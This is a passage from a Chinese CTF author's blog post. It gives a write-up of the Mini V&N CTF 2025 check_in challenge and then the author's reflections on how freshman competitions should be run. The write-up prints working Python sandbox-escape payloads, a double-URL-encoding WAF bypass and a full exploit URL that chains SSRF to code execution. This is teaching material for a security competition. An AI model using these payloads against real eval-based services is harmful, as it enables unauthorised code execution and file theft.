+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(safe_url, allow_redirects=False) # no redirects</span><br></pre></td></tr></table></figure>
+
+<p>这里，当我们带着<code>safe_url</code>访问到<code>/__internal/eval</code>路由的那一瞬间，flask会将<code>safe_url</code>里的参数进行一次<strong>URL解码</strong>。而这个正则表达式的检查，在这次解码之前。也就是从逻辑上来说，<strong>我们获得了一次在 WAF 之后改变 payload 内容的机会</strong>。</p>
+<p>注意到 WAF 没有过滤<code>%</code>。所以至此，利用链成立，我们将 pyjail 的 payload 进行两次 URL 编码（注意此处的编码要将所有字符全部转换）这样<code>AAA</code>就变成了<code>%2541%2541%2541</code>。而解码一次后，在 WAF 时，它会变成进行一次<code>URL</code>解码前的样子。如<code>AAA</code>会变成<code>%41%41%41</code>（<code>%</code>的 URL 编码为 <code>%25</code>）。这不会触发 WAF。而 SSRF 时，<code>%41%41%41</code>会被正常解码为 <code>AAA</code>。</p>
+<p>好，接下来就是 pyjail 环节。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if len(code) &gt;= 24 * 10 + 8 * 8:</span><br><span class="line">    # Man! What can I say. </span><br><span class="line">    return &#x27;Invalid code&#x27;</span><br><span class="line">blacklist = [&#x27;\\x&#x27;,&#x27;+&#x27;,&#x27;join&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">for i in blacklist:</span><br><span class="line">    if i in code:</span><br><span class="line">        return &#x27;Invalid code&#x27;</span><br><span class="line"></span><br><span class="line">safe_globals = &#123;&#x27;__builtins__&#x27;:None, &#x27;lit&#x27;:list, &#x27;dic&#x27;:dict&#125;</span><br><span class="line"></span><br><span class="line">return repr(eval(code, safe_globals))</span><br></pre></td></tr></table></figure>
+
+<p>简单基础的 pyjail。做法很多。这里说几个东西：</p>
+<ul>
+<li><p>很多师傅为了找数字索引（如 87）用位运算符来构造数字（因为除了0和1其他数字都被 ban 了）这个思路是没有问题的。但是更简单的做法是利用 python int 类型字面量的<code>0b</code>二进制来表示数字。如 <code>3</code> 可以用 <code>0b10</code> 来表示，因为1和0没有 ban 所以可以直接用二进制来表示所有数字</p>
+</li>
+<li><p>很多师傅用了公式继承链的办法。其实这里有一些其他的办法可以绕过。继承链受到版本和环境影响，要去找对应的索引，利用起来相对麻烦。以下的 payload，既不需要用到任何除0和1以外的数字，也可以在所有版本通杀：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lit.__class__.__subclasses__(lit.__class__).__getitem__(0).register.__globals__.get(lit(dic(__builtins__=1)).__getitem__(0)).get(lit(dic(open=1)).__getitem__(0))(lit(dic(flag=1)).__getitem__(0)).read()</span><br></pre></td></tr></table></figure>
+
+<p>用<code>abc.ABCMeta</code>的<code>register</code>这个<code>function</code>（而不是<code>method</code>）直接找全局下的<code>__builtins__</code>完成利用。注意这里给出了 flag 所在的文件文件名，所以可以不必 RCE 直接找<code>open</code>读文件就行。</p>
+<p>很多师傅用的 <code>Typhon</code> 工具一把梭。嗯……我其实是试过了，应该是不行的，因为 Typhon 无法处理 RCE 读文件时多出来的空格（list和dict构造字符串是不允许有空格）。这里如果要梭也是用<code>bypassREAD</code>这个 API 去打：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import Typhon</span><br><span class="line">Typhon.bypassREAD(</span><br><span class="line">    &#x27;flag&#x27;,</span><br><span class="line">    local_scope=&#123;&#x27;lit&#x27;: list, &#x27;dic&#x27;: dict, &#x27;__builtins__&#x27;: None&#125;,</span><br><span class="line">    banned_chr= [&#x27;\\x&#x27;,&#x27;+&#x27;,&#x27;join&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;],</span><br><span class="line">    max_length=8*8+24*10,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>比赛的时候这个 API 应该还没有上线。所以是梭不了的。<strong>但是</strong>有些师傅很厉害啊，把空格去了来梭，再想办法加上，更有甚至直接去给我工具源码改了梭了，牛逼👍。</p>
+<p>贴一个来自<code>xinns</code>师傅的 RCE 的示例。用 <code>__repr__</code> 属性获取空格拼接。可供大家学习：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lit(lit.__base__.__subclasses__().__getitem__(11*11--11--1--1--1--1--1--1).__init__.__globals__.values()).__getitem__(11-11-1-1-1-1-1)(lit(dic(cat=1).keys()).__getitem__(0).__add__(dic(a=1).__repr__().__getitem__((1&lt;&lt;(1&lt;&lt;1))|1)).__add__(lit(dic(flag=1).keys()).__getitem__(0))).read()</span><br></pre></td></tr></table></figure>
+
+<p>最后将 payload URL 编码两次，再带上上述的 SSRF 绕过即可。最终 exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.ilovectf.cn:30136/fetch?url=http://vnctf.@localhost:8080/__internal/safe_eval%3fhi=%256c%2569%2574%252e%255f%255f%2563%256c%2561%2573%2573%255f%255f%252e%255f%255f%2573%2575%2562%2563%256c%2561%2573%2573%2565%2573%255f%255f%2528%256c%2569%2574%252e%255f%255f%2563%256c%2561%2573%2573%255f%255f%2529%252e%255f%255f%2567%2565%2574%2569%2574%2565%256d%255f%255f%2528%2530%2529%252e%2572%2565%2567%2569%2573%2574%2565%2572%252e%255f%255f%2567%256c%256f%2562%2561%256c%2573%255f%255f%252e%2567%2565%2574%2528%256c%2569%2574%2528%2564%2569%2563%2528%255f%255f%2562%2575%2569%256c%2574%2569%256e%2573%255f%255f%253d%2531%2529%2529%252e%255f%255f%2567%2565%2574%2569%2574%2565%256d%255f%255f%2528%2530%2529%2529%252e%2567%2565%2574%2528%256c%2569%2574%2528%2564%2569%2563%2528%255f%255f%2569%256d%2570%256f%2572%2574%255f%255f%253d%2531%2529%2529%252e%255f%255f%2567%2565%2574%2569%2574%2565%256d%255f%255f%2528%2530%2529%2529%2528%256c%2569%2574%2528%2564%2569%2563%2528%256c%2569%256e%2565%2563%2561%2563%2568%2565%253d%2531%2529%2529%252e%255f%255f%2567%2565%2574%2569%2574%2565%256d%255f%255f%2528%2530%2529%2529%252e%2567%2565%2574%256c%2569%256e%2565%2528%256c%2569%2574%2528%2564%2569%2563%2528%2566%256c%2561%2567%253d%2531%2529%2529%252e%255f%255f%2567%2565%2574%2569%2574%2565%256d%255f%255f%2528%2530%2529%252c%2531%2529</span><br></pre></td></tr></table></figure>
+
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>后面是一些就最近的出题情况引发的感想。</p>
+<h2 id="新生赛是办来做什么的"><a href="#新生赛是办来做什么的" class="headerlink" title="新生赛是办来做什么的"></a>新生赛是办来做什么的</h2><p>我们到底为什么办新生赛。我依稀记得是为了鼓励新生学东西，不知道有没有师傅对这个有别的想法。所以，新生赛的题目可以很简单，可以非常简单，但是一定要让新生学到东西，而且不能消磨刚入门的人对于 CTF 的兴趣。</p>
+<p>这种比赛的排名是不重要的。我不认为我们需要在新生赛里出很需要区分度的题目，显然这不是需要区分高下的场景。</p>
+<p>ISCTF 的 web 在这方面可以说是反面教材。我认为 ?CTF 和 0xgame(除最后一周) 在这方面就做的相对不错。ISCTF 的 web 到后面的难题，与其说是鼓励新生学习，不如说是来区分新生高下的，或者极端一点，是用来区分新生和老登的，因为新生根本不可能独立做出来。这已经违背了我们办新生赛的初衷。?CTF的题虽然不简单，但是每个题都有引导，都能让新生有及时的正反馈，能让人做下去，学到东西。这样的比赛是好的新生赛。</p>
+<h2 id="又被鞭尸了"><a href="#又被鞭尸了" class="headerlink" title="又被鞭尸了"></a>又被鞭尸了</h2><p>前两天看到 ISCTF <code>难过的bottle</code> 一个题考到了我 XYCTF 曾经出的 trick。唉，每次想到这个 trick 就好难受。</p>
+<p>以前觉得，我发现的东西一定要留个名字在上面，方便我去炫耀。现在觉得，那会在题目上署名简直就是愚蠢到不能再愚蠢的行为。加上也不懂出题，题目质量也就那样吧。做起来很，哦不对，非常折磨。以我现在的眼光去看，就像是，呃，你们去看你们中学时期发的 QQ 空间那种表情。嗯嗯。</p>
+<p>只能说沉淀。越学发现自己不会的越多，真的是这样的。这两天在招新赛遇上了很多才华横溢的新生，他们都比我强，也没我这心气。真正厉害的人都是低调的。</p>
+<p>另外补一个，那个斜体字的题目如果 ban 了所有字符（包括<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>）依然是可以打的。具体怎么打留给大家来想。（我不知道出题人会不会在 wp 里说hhh）</p>
+<p>好了。感谢你看到这里。也感谢你抽出时间，来做我出的题目。谢谢。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCTF-2025-b-by-not1ce-board"><span class="toc-number">2.</span> <span class="toc-text">ISCTF 2025 b@by not1ce board</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mini-V-N-CTF-2025-check-in"><span class="toc-number">3.</span> <span class="toc-text">Mini V&amp;N CTF 2025 check_in</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">4.</span> <span class="toc-text">碎碎念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E7%94%9F%E8%B5%9B%E6%98%AF%E5%8A%9E%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%E7%9A%84"><span class="toc-number">4.1.</span> <span class="toc-text">新生赛是办来做什么的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%88%E8%A2%AB%E9%9E%AD%E5%B0%B8%E4%BA%86"><span class="toc-number">4.2.</span> <span class="toc-text">又被鞭尸了</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-12-10-19328800/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-12-10-19328800/&text=近期的一些出题小记 &amp; 闲话"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-12-10-19328800/&is_video=false&description=近期的一些出题小记 &amp; 闲话"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=近期的一些出题小记 &amp; 闲话&body=Check out this article: https://lamentxu.top/posts/2025-12-10-19328800/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-12-10-19328800/&title=近期的一些出题小记 &amp; 闲话"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-12-10-19328800/&name=近期的一些出题小记 &amp; 闲话&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-12-10-19328800/&t=近期的一些出题小记 &amp; 闲话"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
